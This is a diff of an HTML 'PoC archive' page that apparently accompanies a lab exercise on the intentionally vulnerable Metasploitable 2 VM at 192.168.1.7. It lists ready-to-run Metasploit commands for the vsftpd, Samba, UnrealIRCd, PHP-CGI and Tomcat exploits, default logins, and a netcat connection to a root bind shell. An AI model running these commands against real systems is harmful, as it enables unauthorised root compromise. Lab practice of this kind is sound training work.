@@ -3,267 +3,225 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Drak24Evil | Security Resources</title>
+    <title>Drak24Evil | Professional PoC Terminal</title>
     <style>
         :root {
             --cyber-blue: #00d4ff;
             --critical-red: #ff3e3e;
             --high-orange: #ff9d00;
-            --med-yellow: #ffcc00;
             --dark-bg: #0a0b0c;
             --card-bg: #14171a;
             --accent-green: #00ff41;
+            --modal-bg: #1a1d21;
         }
 
         body {
             background-color: var(--dark-bg);
             color: #e1e1e1;
-            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            line-height: 1.6;
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            margin: 0; padding: 0;
         }
 
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 20px;
-        }
+        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
 
         header {
-            border-left: 5px solid var(--cyber-blue);
             background: var(--card-bg);
-            padding: 30px;
-            margin-bottom: 40px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            padding: 25px;
+            border-bottom: 3px solid var(--cyber-blue);
             display: flex;
             justify-content: space-between;
             align-items: center;
-            flex-wrap: wrap;
+            margin-bottom: 30px;
         }
 
-        .header-info h1 {
-            font-size: 2.2em;
-            color: var(--cyber-blue);
-            text-transform: uppercase;
-            letter-spacing: 3px;
-            margin: 0;
-        }
-
-        .telegram-link {
-            background: #24A1DE;
-            color: white;
-            text-decoration: none;
-            padding: 10px 20px;
-            border-radius: 5px;
-            font-weight: bold;
-            transition: 0.3s;
-            margin-top: 10px;
-        }
-
-        .telegram-link:hover {
-            background: #1e87bb;
-            box-shadow: 0 0 15px rgba(36, 161, 222, 0.4);
-        }
+        .header-title h1 { margin: 0; color: var(--cyber-blue); letter-spacing: 2px; font-size: 1.5em; }
 
         .grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
-            gap: 25px;
+            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
+            gap: 20px;
         }
 
         .card {
             background: var(--card-bg);
-            border: 1px solid #2d333b;
-            padding: 25px;
-            border-radius: 12px;
-            position: relative;
-            transition: transform 0.2s ease, border-color 0.2s ease;
+            border: 1px solid #333;
+            padding: 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: 0.3s;
         }
 
-        .card:hover {
-            transform: translateY(-5px);
-            border-color: var(--cyber-blue);
+        .card:hover { border-color: var(--cyber-blue); transform: scale(1.02); }
+
+        .port-label { color: var(--cyber-blue); font-weight: bold; font-family: monospace; }
+        
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0; top: 0;
+            width: 100%; height: 100%;
+            background-color: rgba(0,0,0,0.9);
+            overflow-y: auto;
         }
 
-        .severity {
-            position: absolute;
-            top: 15px;
-            right: 15px;
-            font-size: 0.75em;
-            padding: 4px 10px;
-            border-radius: 4px;
-            font-weight: 800;
-            text-transform: uppercase;
+        .modal-content {
+            background-color: var(--modal-bg);
+            margin: 5% auto;
+            padding: 30px;
+            border: 1px solid var(--cyber-blue);
+            width: 80%;
+            max-width: 700px;
+            border-radius: 10px;
+            box-shadow: 0 0 30px rgba(0, 212, 255, 0.2);
         }
 
-        .critical { background: var(--critical-red); color: white; }
-        .high { background: var(--high-orange); color: black; }
-        .medium { background: var(--med-yellow); color: black; }
-
-        .port-tag {
-            color: var(--cyber-blue);
-            font-family: 'Courier New', monospace;
+        .close {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
             font-weight: bold;
-            font-size: 0.9em;
+            cursor: pointer;
         }
 
-        h3 {
-            margin: 10px 0;
-            font-size: 1.2em;
-            color: #fff;
-        }
+        .poc-header { border-bottom: 1px solid #444; margin-bottom: 20px; padding-bottom: 10px; }
+        .poc-title { color: var(--critical-red); font-size: 1.4em; font-weight: bold; }
+        
+        .section-title { color: var(--cyber-blue); font-size: 0.9em; text-transform: uppercase; margin-top: 15px; display: block; font-weight: bold; }
+        .section-content { background: #000; padding: 10px; border-radius: 5px; margin-top: 5px; border-left: 3px solid var(--accent-green); white-space: pre-wrap; font-family: monospace; font-size: 0.9em; }
 
-        .impact-box {
-            background: #000;
-            padding: 15px;
-            margin-top: 15px;
-            border-radius: 6px;
-            border: 1px solid #222;
-        }
+        .tag { display: inline-block; padding: 2px 8px; border-radius: 3px; font-size: 0.7em; margin-right: 5px; text-transform: uppercase; font-weight: bold; }
+        .tag-crit { background: var(--critical-red); color: #fff; }
 
-        .cmd-line {
-            color: var(--accent-green);
-            font-family: 'Courier New', monospace;
-            display: block;
-            margin-bottom: 8px;
-            word-break: break-all;
-            font-size: 0.9em;
-        }
-
-        .cmd-line:last-child { margin-bottom: 0; }
-
-        .label { 
-            color: #8b949e; 
-            font-size: 0.75em; 
-            text-transform: uppercase; 
-            display: block;
-            margin-bottom: 5px;
-        }
-
-        footer {
-            text-align: center;
-            margin-top: 60px;
-            padding: 40px;
-            color: #666;
-            border-top: 1px solid #222;
-        }
-
-        @media (max-width: 600px) {
-            header { text-align: center; justify-content: center; }
-            .header-info { margin-bottom: 20px; }
-        }
+        footer { text-align: center; padding: 40px; color: #555; }
+        a { color: var(--cyber-blue); text-decoration: none; }
     </style>
 </head>
 <body>
 
 <div class="container">
     <header>
-        <div class="header-info">
-            <h1>Drak24Evil Security</h1>
-            <div style="color: #888; margin-top: 5px;">TARGET: METASPLOITABLE_V2 // AUDIT RESOURCES</div>
+        <div class="header-title">
+            <h1>DRAK24EVIL SECURITY HUB</h1>
+            <span style="font-size: 0.8em; color: #777;">POC ARCHIVE // CLICK CARD TO GENERATE REPORT</span>
         </div>
-        <a href="https://t.me/Drak24Evil" class="telegram-link" target="_blank">Join Telegram: @Drak24Evil</a>
+        <a href="https://t.me/Drak24Evil" target="_blank" style="color: #24A1DE; font-weight: bold;">t.me/Drak24Evil</a>
     </header>
 
-    <div class="grid">
-        <div class="card">
-            <span class="severity critical">Critical</span>
-            <span class="port-tag">PORT 21 / TCP</span>
-            <h3>Pre-Auth RCE (vsftpd Backdoor)</h3>
-            <div class="impact-box">
-                <span class="label">Exploit Configuration:</span>
-                <code class="cmd-line">use exploit/unix/ftp/vsftpd_234_backdoor</code>
-                <code class="cmd-line">set RHOSTS 192.168.1.7</code>
-                <code class="cmd-line">exploit</code>
-            </div>
+    <div class="grid" id="card-container">
         </div>
 
-        <div class="card">
-            <span class="severity high">High</span>
-            <span class="port-tag">PORT 22, 23 / TCP</span>
-            <h3>Default Credential Vulnerability</h3>
-            <div class="impact-box">
-                <span class="label">Access Method:</span>
-                <code class="cmd-line">User: msfadmin | Pass: msfadmin</code>
-                <code class="cmd-line">ssh msfadmin@192.168.1.7</code>
-            </div>
-        </div>
-
-        <div class="card">
-            <span class="severity critical">Critical</span>
-            <span class="port-tag">PORT 80 / HTTP</span>
-            <h3>PHP-CGI Argument Injection</h3>
-            <div class="impact-box">
-                <span class="label">Exploit Configuration:</span>
-                <code class="cmd-line">use exploit/multi/http/php_cgi_arg_injection</code>
-                <code class="cmd-line">set RHOSTS 192.168.1.7</code>
-                <code class="cmd-line">run</code>
-            </div>
-        </div>
-
-        <div class="card">
-            <span class="severity critical">Critical</span>
-            <span class="port-tag">PORT 445 / SMB</span>
-            <h3>Samba Usermap Script RCE</h3>
-            <div class="impact-box">
-                <span class="label">Exploit Configuration:</span>
-                <code class="cmd-line">use exploit/multi/samba/usermap_script</code>
-                <code class="cmd-line">set RHOSTS 192.168.1.7</code>
-                <code class="cmd-line">exploit</code>
-            </div>
-        </div>
-
-        <div class="card">
-            <span class="severity critical">Critical</span>
-            <span class="port-tag">PORT 1524 / TCP</span>
-            <h3>Unprotected Root Bind Shell</h3>
-            <div class="impact-box">
-                <span class="label">Direct Shell Access:</span>
-                <code class="cmd-line">nc 192.168.1.7 1524</code>
-                <code class="cmd-line"># Result: Immediate root access</code>
-            </div>
-        </div>
-
-        <div class="card">
-            <span class="severity high">High</span>
-            <span class="port-tag">PORT 3306 / MySQL</span>
-            <h3>Unauthenticated DB Access</h3>
-            <div class="impact-box">
-                <span class="label">Terminal Command:</span>
-                <code class="cmd-line">mysql -h 192.168.1.7 -u root</code>
-            </div>
-        </div>
-
-        <div class="card">
-            <span class="severity critical">Critical</span>
-            <span class="port-tag">PORT 6667 / IRC</span>
-            <h3>UnrealIRCd 3.2.8.1 Backdoor</h3>
-            <div class="impact-box">
-                <span class="label">Exploit Configuration:</span>
-                <code class="cmd-line">use exploit/unix/irc/unreal_ircd_3281_backdoor</code>
-                <code class="cmd-line">set RHOSTS 192.168.1.7</code>
-                <code class="cmd-line">exploit</code>
-            </div>
-        </div>
-
-        <div class="card">
-            <span class="severity critical">Critical</span>
-            <span class="port-tag">PORT 8180 / HTTP</span>
-            <h3>Tomcat Manager File Upload</h3>
-            <div class="impact-box">
-                <span class="label">Exploit Configuration:</span>
-                <code class="cmd-line">use exploit/multi/http/tomcat_mgr_deploy</code>
-                <code class="cmd-line">set HttpUsername tomcat</code>
-                <code class="cmd-line">set HttpPassword tomcat</code>
-            </div>
+    <div id="pocModal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="closeModal()">&times;</span>
+            <div id="poc-data"></div>
         </div>
     </div>
 
     <footer>
-        &copy; 2026 Drak24Evil SECURITY // For Educational Purposes Only // Join us at <a href="https://t.me/Drak24Evil" style="color:var(--cyber-blue);">t.me/Drak24Evil</a>
+        &copy; 2026 Drak24Evil Security Resources. All rights reserved.
     </footer>
 </div>
+
+<script>
+    const vulnerabilities = [
+        {
+            port: "21",
+            name: "Pre-Auth Remote Code Execution (vsftpd)",
+            severity: "CRITICAL",
+            target: "192.168.1.7",
+            tool: "Metasploit Framework (msfconsole)",
+            method: "Exploitation of vsftpd 2.3.4 'Smile' Backdoor via intentional string trigger.",
+            impact: "Complete root-level system compromise. Full access to files, users, and network traffic.",
+            exploit: "use exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS 192.168.1.7\nexploit"
+        },
+        {
+            port: "445",
+            name: "Unauthenticated Samba RCE (usermap_script)",
+            severity: "CRITICAL",
+            target: "192.168.1.7",
+            tool: "Metasploit Framework",
+            method: "Abusing 'username map script' configuration error in Samba 3.0.20 to 3.0.25rc3.",
+            impact: "Unauthorized execution of arbitrary commands with root privileges.",
+            exploit: "use exploit/multi/samba/usermap_script\nset RHOSTS 192.168.1.7\nexploit"
+        },
+        {
+            port: "1524",
+            name: "Exposed Administrative Shell (Ingreslock)",
+            severity: "CRITICAL",
+            target: "192.168.1.7",
+            tool: "Netcat (nc)",
+            method: "Direct socket connection to an unauthenticated bind shell listening on port 1524.",
+            impact: "Instant interactive root shell access without credentials.",
+            exploit: "nc 192.168.1.7 1524"
+        },
+        {
+            port: "8180",
+            name: "Arbitrary WAR File Deployment (Tomcat)",
+            severity: "CRITICAL",
+            target: "192.168.1.7",
+            tool: "Metasploit Framework",
+            method: "Authenticated access to Manager GUI using default 'tomcat:tomcat' credentials followed by malicious WAR upload.",
+            impact: "Deployment of web shells allowing for remote command execution (RCE).",
+            exploit: "use exploit/multi/http/tomcat_mgr_deploy\nset HttpUsername tomcat\nset HttpPassword tomcat\nset RHOSTS 192.168.1.7\nset RPORT 8180\nexploit"
+        }
+    ];
+
+    const container = document.getElementById('card-container');
+
+    vulnerabilities.forEach((v, index) => {
+        const card = document.createElement('div');
+        card.className = 'card';
+        card.onclick = () => openModal(index);
+        card.innerHTML = `
+            <span class="port-label">PORT ${v.port} / TCP</span>
+            <h3>${v.name}</h3>
+            <p style="font-size:0.8em; color:#888;">Click to view HackerOne style PoC report.</p>
+        `;
+        container.appendChild(card);
+    });
+
+    function openModal(index) {
+        const v = vulnerabilities[index];
+        const modal = document.getElementById('pocModal');
+        const data = document.getElementById('poc-data');
+        
+        data.innerHTML = `
+            <div class="poc-header">
+                <span class="tag tag-crit">${v.severity}</span>
+                <div class="poc-title">REPORT: ${v.name}</div>
+            </div>
+            
+            <span class="section-title">TARGET IP</span>
+            <div class="section-content">${v.target}</div>
+
+            <span class="section-title">TOOL USED</span>
+            <div class="section-content">${v.tool}</div>
+
+            <span class="section-title">METHODOLOGY</span>
+            <div class="section-content">${v.method}</div>
+
+            <span class="section-title">IMPACT</span>
+            <div class="section-content">${v.impact}</div>
+
+            <span class="section-title">EXPLOIT POC COMMANDS</span>
+            <div class="section-content" style="color:var(--accent-green)">${v.exploit}</div>
+        `;
+        
+        modal.style.display = "block";
+    }
+
+    function closeModal() {
+        document.getElementById('pocModal').style.display = "none";
+    }
+
+    window.onclick = function(event) {
+        if (event.target == document.getElementById('pocModal')) {
+            closeModal();
+        }
+    }
+</script>
 
 </body>
 </html>
